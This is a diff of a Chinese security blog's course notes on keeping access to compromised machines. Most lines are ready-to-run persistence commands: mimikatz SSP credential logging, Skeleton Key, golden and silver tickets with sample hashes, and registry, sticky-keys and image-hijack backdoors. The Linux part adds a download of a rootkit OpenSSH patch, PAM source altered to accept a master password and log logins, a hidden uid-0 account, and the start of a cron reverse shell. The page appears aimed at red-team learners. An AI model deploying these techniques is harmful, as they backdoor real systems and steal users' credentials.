@@ -24,13 +24,15 @@
 <link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
+  <meta name="keywords" content="渗透测试" />
+
 
 <link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">
 
 
 
   <title>
- |
+XD22 12 权限维持 - 信息安全 |
 Phut Hon = X_T = 天行健，君子以自强不息</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -58,23 +60,23 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
+  <h1 itemprop="name headline">XD22 12 权限维持
   </h1>
   
 <div class="meta">
-  <span class="item" title="创建时间：2023-07-04 01:49:06">
+  <span class="item" title="创建时间：2023-07-04 00:00:00">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
     <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2023-07-04T01:49:06+08:00">2023-07-04</time>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-04T00:00:00+08:00">2023-07-04</time>
   </span>
   <span class="item" title="本文字数">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>11k</span>
+    <span>15k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -82,7 +84,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-clock"></i>
     </span>
     <span class="text">阅读时长</span>
-    <span>19 分钟</span>
+    <span>24 分钟</span>
   </span>
 </div>
 
@@ -115,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/KW4nDo2ZJuVILkS.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/zcSdCfaZpwgIBoW.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/tXT3iV8jZfaQcCF.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/JUZqV6zBpbmk97w.jpg"></li>
           <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ukLG5BwF6jH1ONA.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/yxb6m3Ak4MhTNvU.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/yonQxXhNmEuMgF2.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/eZcPaFH4pt9Cx8k.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/AG1hjZYM3aSKz6H.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/YEamGBSIV7f2MAH.jpg"></li>
         </ul>
       </div>
     </header>
@@ -145,7 +147,9 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">首页</a></span>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
@@ -164,438 +168,137 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h3 id="121-内网域维持权限"><a class="markdownIt-Anchor" href="#121-内网域维持权限">#</a> 12.1 内网域维持权限</h3>
+    <h3 id="内网域维持权限"><a class="markdownIt-Anchor" href="#内网域维持权限">#</a> 内网域维持权限</h3>
 <p>参考资料：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGN4YmxvZ3MvcC8xNDIxNjUyNS5odG1s">https://www.cnblogs.com/lcxblogs/p/14216525.html</span></p>
-<h4 id="1211-验证dll加载ssp与hook"><a class="markdownIt-Anchor" href="#1211-验证dll加载ssp与hook">#</a> 12.1.1 验证 DLL 加载 SSP 与 HOOK</h4>
-<h5 id="基于验证-dll-加载-ssp"><a class="markdownIt-Anchor" href="#基于验证-dll-加载-ssp">#</a> # 基于验证 DLL 加载 - SSP</h5>
-<h5 id="攻防实战中靶机很难会重启攻击者重启的话风险过大因此可以在靶"><a class="markdownIt-Anchor" href="#攻防实战中靶机很难会重启攻击者重启的话风险过大因此可以在靶">#</a> 攻防实战中，靶机很难会重启，攻击者重启的话风险过大，因此可以在靶</h5>
-<h5 id="机上把两个方法相互结合起来使用效果比较好尝试利用把生成的日志密码文"><a class="markdownIt-Anchor" href="#机上把两个方法相互结合起来使用效果比较好尝试利用把生成的日志密码文">#</a> 机上把两个方法相互结合起来使用效果比较好，尝试利用把生成的日志密码文</h5>
-<h5 id="件发送到内网被控机器或者临时邮箱"><a class="markdownIt-Anchor" href="#件发送到内网被控机器或者临时邮箱">#</a> 件发送到内网被控机器或者临时邮箱。</h5>
-<h5 id="1-但如果域控制器重启被注入内存的伪造的ssp将会丢失"><a class="markdownIt-Anchor" href="#1-但如果域控制器重启被注入内存的伪造的ssp将会丢失">#</a> （ 1 ）但如果域控制器重启，被注入内存的伪造的 SSP 将会丢失。</h5>
-<p>privilege::debug<br>
-misc::memssp<br>
-C:\Windows\System32\mimilsa.log 记录登录的账号密码<br>
-（ 2 ）使用此方法即使系统重启，也不会影响到持久化的效果。<br>
-mimilib.dll 传到目标域控的 c:\windows\system32\ 目录下<br>
-修改注册表，重启生效<br>
- reg query hklm\system\currentcontrolset\control\lsa\ /v “Security Packages”<br>
-reg add “HKLM\System\CurrentControlSet\Control\Lsa” /v “Security Packag<br>
-es” /d “kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib” /t REG_M<br>
-ULTI_SZ<br>
-c:\windows\system32\kiwissp.log 记录账号密码文件</p>
-<p><strong>#</strong> 基于验证 <strong>DLL</strong> 加载 <strong>- HOOK</strong></p>
+<h4 id="验证dll加载-ssp"><a class="markdownIt-Anchor" href="#验证dll加载-ssp">#</a> 验证 DLL 加载 SSP</h4>
+<p>攻防实战中，靶机很难会重启，攻击者重启的话风险过大，因此可以在靶机上把两个方法相互结合起来使用效果比较好，尝试利用把生成的日志密码文件发送到内网被控机器或者临时邮箱。</p>
+<p>（ 1 ）但如果域控制器重启，被注入内存的伪造的 SSP 将会丢失。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出密码</span></span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记录登录的账号密码</span></span><br><span class="line">C:\Windows\System32\mimilsa.log </span><br></pre></td></tr></table></figure>
+<p>（ 2 ）使用此方法即使系统重启，也不会影响到持久化的效果。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mimilib</span></span><br><span class="line">mimilib.dll 传到目标域控的c:\windows\system32\目录下</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改注册表，重启生效</span></span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v &quot;Security Packages&quot;</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; /t REG_MULTI_SZ</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">记录账号密码文件</span></span><br><span class="line">c:\windows\system32\kiwissp.log </span><br></pre></td></tr></table></figure>
+<h4 id="验证dll加载-hook"><a class="markdownIt-Anchor" href="#验证dll加载-hook">#</a> 验证 DLL 加载 HOOK</h4>
 <p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3doME5zcS9Ib29rUGFzc3dvcmRDaGFuZ2U=">https://github.com/wh0Nsq/HookPasswordChange</span><br>
-<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvTWlzYy1XaW5kb3dzLUhhY2tpbmc=">https://github.com/clymb3r/Misc-Windows-Hacking</span><br>
-powershell -exec bypass -Command “&amp; {Import-Module ‘C:\Invoke-Reflecti<br>
-vePEInjection.ps1’;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.<br>
-dll -procname lsass}”</p>
-<h4 id="1212-机制账号启用dsrm"><a class="markdownIt-Anchor" href="#1212-机制账号启用dsrm">#</a> 12.1.2 机制账号启用 DSRM</h4>
-<h5 id="利用系统自带机制模式dsrm修改dsrm默认登录方式和属性通过其"><a class="markdownIt-Anchor" href="#利用系统自带机制模式dsrm修改dsrm默认登录方式和属性通过其">#</a> 利用系统自带机制模式 DSRM，修改 DSRM 默认登录方式和属性，通过其</h5>
-<p>同步 krgtgt 进行 PTH 攻击，实现持续化控制，但适用于系统 &gt;=windows server2<br>
-008 。每个域控制器都有本地管理员账号和密码（与域管理员账号和密码不同）。<br>
-DSRM 账号可以作为一个域控制器的本地管理员用户，通过网络连接域控制器，<br>
-进而控制域控制器。<br>
-（ 1 ）获取 dsrm 及 krbtgt 的 NTLM hash<br>
-privilege::debug<br>
-lsadump::lsa /patch /name:krbtgt<br>
-token::elevate<br>
-lsadump::sam<br>
-（ 2 ）dsrm&amp;krbtgt&amp;NTLM hash 同步<br>
- NTDSUTIL：打开 ntdsutil<br>
-set DSRM password：修改 DSRM 的密码<br>
- sync from domain account 域用户名字：使 DSRM 的密码和指定域用户的<br>
-密码同步<br>
- q (第 1 次)：退出 DSRM 密码设置模式<br>
- q (第 2 次)：退出 ntdsutil<br>
-（ 3 ）修改 dsrm 登录方式<br>
- New-ItemProperty “hklm:\system\currentcontrolset\control\lsa” -name “dsrma<br>
-dminlogonbehavior” -value 2 -propertyType DWORD<br>
-（ 4 ）利用 PTH 传递攻击<br>
- privilege::debug<br>
-sekurlsa::pth /domain:owa2010cn-god /user:administrator /ntlm:b097d7ed9749<br>
-5408e1537f706c357fc5<br>
-dir \owa2010cn-god\c$</p>
-<h4 id="1213-用户属性修改sid-history"><a class="markdownIt-Anchor" href="#1213-用户属性修改sid-history">#</a> 12.1.3 用户属性修改 SID History</h4>
-<p><strong>#</strong> 基于用户属性修改 <strong>- SID history</strong></p>
-<p>把域控管理员的 SID 加入到其他某个恶意的域账户的 SID History 中，然后<br>
-这个恶意的（我们自己创建的）域账户就可以域管理员权限访问域控了，不修<br>
-改域账户一直存在。<br>
-（ 1 ）获取某用户 SID 属性</p>
-<p>Import-Module ActiveDirectory<br>
-Get-ADUser webadmin -Properties sidhistory<br>
-（ 2 ）给予某用户 administrator 属性：<br>
-privilege::debug<br>
-sid::patch<br>
-sid::add /sam:webadmin /new:administrator<br>
-（ 3 ）测评给与前后的 DC 访问权限：<br>
-dir \192.168.3.21\c$</p>
-<h4 id="1214-登录进程劫持skeleton-key"><a class="markdownIt-Anchor" href="#1214-登录进程劫持skeleton-key">#</a> 12.1.4 登录进程劫持 Skeleton Key</h4>
-<p><strong>#</strong> 基于登录进程劫持 <strong>- Skeleton Key</strong></p>
-<p>因为 Skeleton Key 技术是被注入到 lsass.exe 进程的，所以它只存在内存中，<br>
-如域控重启，万能密码将失效。<br>
-（ 1 ）测试域内某个用户与 DC 通讯 dir \owa2010cn-god\c
-（ 2 ）连接DC后，DC注入lsass进程
-net use \\192.168.3.21\ipc “Admin12345” /user:god\administrator<br>
-mimikatz：<br>
-privilege::debug<br>
-misc::skeleton<br>
-（ 3 ）重新测试域内某个用户与 DC 通讯<br>
- net use \owa2010cn-god\ipc$ “mimikatz” /user:god\administrator<br>
-dir \owa2010cn-god\c$</p>
-<h4 id="1215-隐藏域管用户"><a class="markdownIt-Anchor" href="#1215-隐藏域管用户">#</a> 12.1.5 隐藏域管用户</h4>
-<h5 id="内网域-单机版-权限维持-基于用户-隐藏用户"><a class="markdownIt-Anchor" href="#内网域-单机版-权限维持-基于用户-隐藏用户">#</a> # 内网域 &amp; 单机版 - 权限维持 - 基于用户 - 隐藏用户</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">项目地址：https://github.com/wgpsec/CreateHiddenAccount</span><br><span class="line">控制面板能查看到，命令查看看不到，单机版无法删除，域环境可以删除。</span><br><span class="line">CreateHiddenAccount -u xiaodi -p Xiaodi!@#45</span><br></pre></td></tr></table></figure>
-<h4 id="1216-黄金白银票据"><a class="markdownIt-Anchor" href="#1216-黄金白银票据">#</a> 12.1.6 黄金白银票据</h4>
-<h5 id="基于服务-tgt-黄金白银票据"><a class="markdownIt-Anchor" href="#基于服务-tgt-黄金白银票据">#</a> # 基于服务 TGT- 黄金白银票据</h5>
-<p>黄金票据生成攻击，是生成有效的 TGT Kerberos 票据，并且不受 TGT 生<br>
-命周期的影响（TGT 默认 10 小时，最多续订 7 天），这里可以为任意用户生称</p>
-<h5 id="黄金票据然后为域管理员生成tgt这样普通用户就可以变成域管理员"><a class="markdownIt-Anchor" href="#黄金票据然后为域管理员生成tgt这样普通用户就可以变成域管理员">#</a> 黄金票据，然后为域管理员生成 TGT，这样普通用户就可以变成域管理员。</h5>
-<p>白银票据（SILVER TICKET）是利用域的服务账户进行伪造的 ST，在 Ker<br>
-beros 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进<br>
-行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST，<br>
-从而获得 Session Key。所以只需要知道 Server 用户的 Hash 就可以伪造出一个<br>
- ST，且不会经过 KDC，但是伪造的门票只对部分服务起作用（不需要交互 KD<br>
-C，需要知道 Server 的 NTLM Hash）。</p>
-<h5 id="黄金方法"><a class="markdownIt-Anchor" href="#黄金方法">#</a> # 黄金方法：</h5>
-<p>已经拿下域管理员，获取到 krbtgt hash；利用 krbtgt 的 hash 制作黄金票据<br>
-工具，进行攻击。该攻击方式其实是一种后门的形式，属于第二次进行攻击的<br>
-方法。第一次拿到域管权限之后，需要将 krbtgt NTLM hash 进行保存，当第二<br>
-次再来进行域渗透攻击时，我们就可使用 krbtgt 的 NTLM hash 制作黄金票据，<br>
-从而再次获得域管权限。<br>
-（ 1 ）获取域名，域 sid 值<br>
-域名：<span class="exturl" data-url="aHR0cDovL2dvZC5vcmc=">god.org</span>，域 SID 值：S- 1 - 5 - 21 - 1218902331 - 2157346161 - 1782232778</p>
-<blockquote>
-<p>whoami /user<br>
-whoami /all<br>
-wmic useraccount get name,sid<br>
-（ 2 ）获取 krbtgt 的 ntlm：<br>
-域的 KRBTGT 账户 NTLM-HASH：b097d7ed97495408e1537f706c357fc5<br>
-mimikatz privilege::debug<br>
-mimikatz lsadump::lsa /patch<br>
-（ 3 ）伪造用户名：webadmin（任意用户名）<br>
-生成票据：<br>
-mimikatz kerberos::golden /user:webadmin /domain:god.org /sid:S- 1 - 5 - 21 - 12<br>
-18902331 - 2157346161 - 1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /t<br>
-icket:g<br>
- 导入内存：mimikatz kerberos::ptt g<br>
- 访问测试：dir \owa2010cn-god\c$</p>
-</blockquote>
-<h5 id="白银方法"><a class="markdownIt-Anchor" href="#白银方法">#</a> # 白银方法</h5>
-<p>已经拿下域管理员，获取到 DC hash；利用 DC 的 hash 制作白银票据工具，<br>
-进行攻击。伪造的 ST，只能访问指定的服务，如 CIFS；不与 KDC 交互，直接</p>
-<p>访问 Server；ST 由服务账号 NTLM Hash 加密。<br>
-（ 1 ）获取域名，域 sid 值<br>
-域名：<span class="exturl" data-url="aHR0cDovL2dvZC5vcmc=">god.org</span>、域 SID 值：S- 1 - 5 - 21 - 1218902331 - 2157346161 - 1782232778</p>
-<blockquote>
-<p>whoami /user<br>
-whoami /all<br>
-wmic useraccount get name,sid<br>
-（ 2 ）获取 dc 账户的 ntlm：<br>
-域 DC 账户 NTLM-HASH：82779569ef27d72b88b6c93dd8b37299<br>
-mimikatz privilege::debug<br>
-mimikatz sekurlsa::logonpasswords<br>
-（ 3 ）伪造用户名：webadmin（任意用户名）<br>
-导入票据：（CIFS 文件共享服务）<br>
-domain：域名<br>
- sid：域环境下的 SID，除去最后 - 的部分剩下的内容<br>
- target：要访问的服务器，写 FQDN<br>
-rc4：写的是目标主机的 NTLM（主机名 $ 对应 NTLM）<br>
-service：要访问的资源类型<br>
- user：伪造的用户<br>
- cifs：共享文件<br>
- mimikatz kerberos::golden /user:webadmin /domain:god.org/sid:S- 1 - 5 - 21 - 12<br>
-18902331 - 2157346161 - 1782232778 /target:owa2010cn-god /service:cifs /rc4:82779<br>
-569ef27d72b88b6c93dd8b37299 /ptt</p>
-</blockquote>
-<h4 id="1217-上传gotohttp与rustdesk"><a class="markdownIt-Anchor" href="#1217-上传gotohttp与rustdesk">#</a> 12.1.7 上传 GotoHTTP 与 RustDesk</h4>
-<p>横向移动在上传木马的时候，将这两款软件直接上传上去，powershell 读配<br>
-置文件将连接账户和密码发送至外边，进行连接！<br>
-GotoHTTP：<span class="exturl" data-url="aHR0cHM6Ly9nb3RvaHR0cC5jb20vZ290by9kb3dubG9hZC4xMng=">https://gotohttp.com/goto/download.12x</span><br>
-RustDesk：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1c3RkZXNrL3J1c3RkZXNr">https://github.com/rustdesk/rustdesk</span><br>
-（ 1 ）有网连接：<br>
-C:\Users\ 用户名 \AppData\Roaming\RustDesk\config<br>
- 其中 ID 和密码在 RustDesk.toml 文件里。<br>
-（ 2 ）无网内网连接：IP 直连<br>
- RustDesk2.toml<br>
-direct-server = ‘Y’</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">direct-access-port = &#x27;8443&#x27;</span><br></pre></td></tr></table></figure>
-<h3 id="122-windows单机维持权限"><a class="markdownIt-Anchor" href="#122-windows单机维持权限">#</a> 12.2 windows 单机维持权限</h3>
-<h4 id="1221-自启动"><a class="markdownIt-Anchor" href="#1221-自启动">#</a> 12.2.1 自启动</h4>
-<h5 id="1-自启动路径加载"><a class="markdownIt-Anchor" href="#1-自启动路径加载">#</a> （ 1 ）自启动路径加载</h5>
-<p>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Pro<br>
-grams\Startup\</p>
-<p>（ 2 ）自启动服务加载</p>
-<p>sc create ServiceTest binPath= C:\xd.exe start= auto<br>
-sc delete ServiceTest<br>
-（ 3 ）自启动注册表加载<br>
-当前用户键值<br>
- HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>
- 服务器键值（需要管理员权限）<br>
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>
- 添加启动项<br>
- REG ADD “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /V<br>
-“backdoor” /t REG_SZ /F /D “C:\xd.exe”<br>
-（ 4 ）计划计时任务 - 参考前面横向移动课程</p>
-<h4 id="1222-粘滞键"><a class="markdownIt-Anchor" href="#1222-粘滞键">#</a> 12.2.2 粘滞键</h4>
-<h5 id="系统自带的辅助功能进行替换执行放大镜旁白屏幕键盘等均可-基"><a class="markdownIt-Anchor" href="#系统自带的辅助功能进行替换执行放大镜旁白屏幕键盘等均可-基">#</a> 系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。基</h5>
-<h5 id="本没用了"><a class="markdownIt-Anchor" href="#本没用了">#</a> 本没用了。</h5>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">粘滞键位置：c:\windows\system32\sethc.exe</span><br><span class="line">move sethc.exe sethc1.exe</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
-<h4 id="1223-映像劫持"><a class="markdownIt-Anchor" href="#1223-映像劫持">#</a> 12.2.3 映像劫持</h4>
-<p>测试：执行 notepad 成 cmd<br>
-REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Ima<br>
-ge File Execution Options\notepad.exe” /v debugger /t REG_SZ /d &quot;C:\Window</p>
-<p>s\System32\cmd.exe /c calc&quot;<br>
- 配合 GlobalFlag 隐藏：执行正常关闭后触发<br>
- reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image<br>
-File Execution Options\notepad.exe” /v GlobalFlag /t REG_DWORD /d 512<br>
-reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentP<br>
-rocessExit\notepad.exe” /v ReportingMode /t REG_DWORD /d 1<br>
-reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentP<br>
-rocessExit\notepad.exe” /v MonitorProcess /d “C:\xd.exe”</p>
-<h4 id="1224-屏保与登录"><a class="markdownIt-Anchor" href="#1224-屏保与登录">#</a> 12.2.4 屏保与登录</h4>
-<p>（ 1 ）WinLogon 配合无文件落地上线<br>
- REG ADD “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Win<br>
-logon” /V “Userinit” /t REG_SZ /F /D “C:\xd.exe”<br>
-（ 2 ）屏幕保护生效后执行后门<br>
- reg add “HKEY_CURRENT_USER\Control Panel\Desktop” /v SCRNSAVE.<br>
-EXE /t REG_SZ /d “C:\xd.exe” /f</p>
-<h3 id="123-linux单机维持权限"><a class="markdownIt-Anchor" href="#123-linux单机维持权限">#</a> 12.3 linux 单机维持权限</h3>
-<h4 id="1231-openssh版本后门"><a class="markdownIt-Anchor" href="#1231-openssh版本后门">#</a> 12.3.1 OpenSSH 版本后门</h4>
-<p>替换本身操作系统的 ssh 协议支撑软件 openssh，重新安装自定义的 openss<br>
-h, 达到记录帐号密码，也可以采用万能密码连接的功能。更隐秘的方法可以做<br>
-版本修改及文件修改时间处理。<br>
-（ 1 ）参考链接：<br>
-<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3NuZC9wLzExODA3NjUzLmh0bWw=">https://www.cnblogs.com/csnd/p/11807653.html</span><br>
-<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQk5ySkhVczlxeEVWSE5TRkVnaGFSdw==">https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw</span><br>
-（ 2 ）环境准备：<br>
-yum -y install openssl openssl-devel pam-devel zlib zlib-devel<br>
-yum -y install gcc gcc-c++ make<br>
-wget <span class="exturl" data-url="aHR0cDovL2NvcmUuaXBzZWNzLmNvbS9yb290a2l0L3BhdGNoLXRvLWhhY2svMHgwNi1vcGVuc3NoLTUuOXAxLnBhdGNoLnRhci4=">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.</span><br>
-gz<br>
-wget <span class="exturl" data-url="aHR0cHM6Ly9taXJyb3IuYWFybmV0LmVkdS5hdS9wdWIvT3BlbkJTRC9PcGVuU1NIL3BvcnRhYmxlL29wZW5zc2gtNS45">https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9</span><br>
-p1.tar.gz</p>
-<p>tar -xzvf openssh-5.9p1.tar.gz<br>
-tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz<br>
-cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1<br>
-cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff<br>
-vim version.h<br>
-（ 3 ）编辑密码：<br>
-vim includes.h<br>
-177 #define ILOG “/tmp/ilog”#ILOG 是别人用 ssh 登录该主机记录的日志<br>
- 178 #define OLOG “/tmp/olog”#OLOG 是该主机用 ssh 登录其他主机记录的<br>
-日志目录<br>
- 179 #define SECRETPW “xiaodi”# 万能密码<br>
- 180 #endif /* INCLUDES_H */<br>
-（ 4 ）安装编译：<br>
-./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;<br>
-&amp; make &amp;&amp; make install<br>
-service sshd restart #重启 sshd 服务<br>
- systemctl status sshd.service #查看 ssh 启动状态<br>
-（ 5 ）拓展玩法（未成功）<br>
-可以采用万能密码登录 、实现监控服务器登录登出的账号密码（发到外网）</p>
-<h4 id="1232-ssh-pam后门"><a class="markdownIt-Anchor" href="#1232-ssh-pam后门">#</a> 12.3.2 SSH PAM 后门</h4>
-<p>PAM 是一种认证模块，PAM 可以作为 Linux 登录验证和各类基础服务的认<br>
-证，简单来说就是一种用于 Linux 系统上的用户身份验证的机制。进行认证时<br>
-首先确定是什么服务，然后加载相应的 PAM 的配置文件 (位于 /etc/pam.d)，最后<br>
-调用认证文件 (于 /lib/security) 进行安全认证。简易利用的 PAM 后门也是通过修改<br>
- PAM 源码中认证的逻辑来达到权限维持<br>
-（ 1 ）参考链接：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkwMg==">https://xz.aliyun.com/t/7902</span><br>
- 获取目标系统使用的 PAM 版本，下载对应版本的 pam 版本。解压缩，改 p<br>
-am_unix_auth.c 文件，添加万能密码。编译安装 PAM。编译完后的文件在：mo<br>
-dules/pam_unix/.libs/pam_unix.so，复制到 /lib64/security 中进行替换，即使用万<br>
-能密码登陆，将用户名密码记录到文件中。<br>
-（ 2 ）配置环境<br>
-关闭 selinux： setenforce 0<br>
- 查询版本： rpm -qa | grep pam</p>
-<p>安装此版本：wget <span class="exturl" data-url="aHR0cDovL3d3dy5saW51eC1wYW0ub3JnL2xpYnJhcnkvTGludXgtUEFNLTEuMS44LnRhci5neg==">http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</span><br>
- 解压：tar -zxvf Linux-PAM-1.1.8<br>
- 安装依赖：yum install gcc flex flex-devel -y<br>
-（ 3 ）修改配置：<br>
-留 PAM 后门和保存 SSH 登录的账号密码<br>
-修改 Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c<br>
-180 行 /* verify the password of this user */<br>
-retval = _unix_verify_password(pamh, name, p, ctrl);<br>
-if (strcmp (“hackers”,p)==0){return PAM_SUCCESS;} // 后门密码<br>
- if (retval == PAM_SUCCESS){<br>
-FILE * fp;<br>
-fp = fopen (&quot;/tmp/.sshlog&quot;, “a”);//SSH 登录用户密码保存位置<br>
- fprintf (fp, “% s : % s\n”, name, p);<br>
-fclose(fp);}<br>
-name = p = NULL;<br>
-AUTH_RETURN;<br>
-（ 4 ）安装并备份<br>
-编译安装：./configure &amp;&amp; make<br>
- 备份原有 pam_unix.so，防止出现错误登录不上，复制新 PAM 模块到 /lib64/<br>
-security/ 目录下<br>
- cp /usr/lib64/security/pam_unix.so/tmp/pam_unix.so.bakcp<br>
-cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/p<br>
-am_unix.so</p>
-<h4 id="1233登录方式后门"><a class="markdownIt-Anchor" href="#1233登录方式后门">#</a> 12.3.3 登录方式后门</h4>
-<h5 id="1-ssh软链接"><a class="markdownIt-Anchor" href="#1-ssh软链接">#</a> （ 1 ）SSH 软链接</h5>
-<p>在 sshd 服务配置启用 PAM 认证的前提下，PAM 配置文件中控制标志为 suf<br>
-ficient 时，只要 pam_rootok 模块检测 uid 为 0 （root）即可成功认证登录。重启<br>
-之后会失效，而且会多出来一个端口。<br>
-查看是否使用 PAM 进行身份验证：cat /etc/ssh/sshd_config|grep UsePAM<br>
-ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888<br>
-ssh root@xx.xx.xx.xx -p 8888 任意密码登录即可<br>
-（ 2 ）公私钥<br>
-参考链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YxNzcyMTM0NS8=">https://www.bilibili.com/read/cv17721345/</span></p>
-<p>生成密钥对：ssh-keygen -t rsa<br>
- 修改 ssh 配置：vim /etc/ssh/sshd_config<br>
-RSAAuthentication yes<br>
-PubkeyAuthentication yes<br>
-AuthorizedKeysFile .ssh/authorized_keys<br>
-（ 3 ）添加 root 帐号<br>
-添加账号 test1，设置 uid 为 0 ，密码为 123456<br>
-useradd -p  <code>openssl passwd - 1 - salt 'salt' 123456</code>  test1 -o -u 0 -g root -G<br>
-root -s /bin/bash -d /home/test1<br>
- 或者直接打印到 passwd 中：<br>
-echo “xiaodi❌0:0:😕:/bin/sh” &gt;&gt; /etc/passwd #增加超级用户账号<br>
- passwd xiaodi #修改 xiaodi 的密码为 xiaodi123</p>
-<h4 id="1234定时任务后门"><a class="markdownIt-Anchor" href="#1234定时任务后门">#</a> 12.3.4 定时任务后门</h4>
-<p>利用系统的定时任务功能进行反弹 Shell<br>
-（ 1 ）编辑后门反弹<br>
- vim /etc/.xiaodi.sh<br>
